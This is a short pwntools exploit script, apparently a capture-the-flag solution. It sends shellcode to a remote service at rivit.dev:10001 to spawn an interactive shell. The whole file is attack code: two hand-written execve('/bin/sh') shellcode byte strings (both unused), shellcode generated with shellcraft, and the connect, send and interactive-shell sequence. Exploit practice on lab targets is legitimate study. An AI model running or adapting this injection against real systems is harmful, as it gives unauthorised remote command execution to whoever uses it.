from pwn import *

context.binary = ELF('./vuln')

shell64 = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
shell32 = b"\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
shell = asm(shellcraft.amd64.linux.sh())

#io = process('./vuln')
#gdb.attach(io, api=True)
io = remote('rivit.dev', 10001)
io.recvuntil(b'?\n')
io.sendline(shell)
io.interactive()